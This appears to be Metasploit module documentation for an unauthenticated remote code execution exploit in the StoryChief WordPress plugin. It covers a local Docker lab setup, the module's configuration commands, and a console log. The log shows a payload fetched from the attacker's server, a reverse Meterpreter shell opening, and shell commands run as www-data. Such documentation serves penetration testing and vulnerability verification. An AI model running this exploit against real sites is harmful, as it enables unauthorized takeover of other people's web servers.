## Vulnerable Application

This module exploits an unauthenticated Remote Code Execution (RCE)
vulnerability in the StoryChief WordPress plugin version 1.0.42 and below.

The vulnerability exists due to improper validation of webhook HMAC
signatures. The plugin accepts a forged signature when the shared
secret is empty. This allows unauthenticated attackers to submit crafted
webhook requests that cause the server to:

1. Fetch attacker-controlled content
2. Store it inside the WordPress uploads directory
3. Execute arbitrary PHP code

No authentication or user interaction is required.

## Verification Steps

### 1. Start the Lab

Create the following `docker-compose.yml` file:

```yaml
version: '3.8'

services:
  wordpress:
    image: wordpress:6.3.2
    container_name: wp_storychief
    restart: always
    ports:
      - "8080:80"
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: root
      WORDPRESS_DB_PASSWORD: rootpass
      WORDPRESS_DB_NAME: wordpress
    depends_on:
      - db

  db:
    image: mysql:5.7
    container_name: wp_db
    restart: always
    environment:
      MYSQL_DATABASE: wordpress
      MYSQL_ROOT_PASSWORD: rootpass
````

Start the containers:

```
docker compose up -d
docker ps
```

Ensure both containers are running and port 8080 is accessible.

If port 8080 is already in use, modify:

```
ports:
  - "8081:80"
```

Then remember to update Metasploit:

```
set RPORT 8081
```

### 2. Complete WordPress Installation

Navigate to:

```
http://localhost:8080
```

Finish the WordPress setup wizard.

After logging in, configure permalinks:

```
http://localhost:8080/wp-admin/options-permalink.php
```

Change from **Plain** to **Post name** and click **Save Changes**.

### 3. Install Vulnerable Plugin

Upload StoryChief version 1.0.42 and activate it.

Ensure the webhook feature is enabled and leave the webhook secret empty.

Confirm plugin version inside the container:

```
docker exec -it wp_storychief bash
cd /var/www/html/wp-content/plugins
grep Version story-chief/storychief.php
```

Expected output:

```
Version: 1.0.42
```

### 4. Launch Metasploit

```
msfconsole
use exploit/multi/http/wp_plugin_story_chef_file_upload
```

### 5. Configure Module

```
set RHOSTS 127.0.0.1
set RPORT 8080
set TARGETURI /
set LHOST <attacker-ip>
set SRVPORT 8000
```

Ensure SRVPORT does not conflict with the WordPress port.

### 6. Run the Exploit

```
run
```

If successful, a Meterpreter session should open.

### 7. Confirm Code Execution

Inside Meterpreter:

```
sysinfo
getuid
```

Successful exploitation confirms arbitrary PHP code execution
within the WordPress container context.

## 8. Validate Container Isolation (Optional)

From Meterpreter shell:

```
cat /proc/1/cgroup
```

You should observe containerized environment behavior.

This confirms exploitation is limited to container context.

## Options



## Scenarios

```
msf exploit(multi/http/wp_plugin_story_chef_file_upload) > run 


[*] Started reverse TCP handler on 172.21.176.212:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. StoryChief webhook endpoint reachable and likely vulnerable
[*] Starting local HTTP server for payload hosting
[*] Using URL: http://172.21.176.212:8000/LwYLvAyJV.php
[*] Payload URL: http://172.21.176.212:8000/LwYLvAyJV.php/LwYLvAyJV.php
[*] Sending malicious webhook request
[+] Serving malicious payload to 172.21.176.1
[+] Webhook accepted payload — attempting execution
[*] Attempting to execute uploaded payload at /wp-content/uploads/2026/02/LwYLvAyJV.php
[*] Sending stage (42137 bytes) to 172.21.176.1
[+] Deleted LwYLvAyJV.php
[*] Meterpreter session 1 opened (172.21.176.212:4444 -> 172.21.176.1:55688) at 2026-02-15 19:08:57 +0200


meterpreter > sysinfo 
Computer        : 41dcc6d2d33a
OS              : Linux 41dcc6d2d33a 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64
Architecture    : x64
System Language : C
Meterpreter     : php/linux 
meterpreter > getuid
Server username: www-data
meterpreter > shell
whoami
www-data
pwd
/var/www/html/wp-content/uploads/2026/02

```
If you see:

```
Upload path did not return HTTP 200
```

but a session opens successfully — this is a harmless race condition and can be ignored.
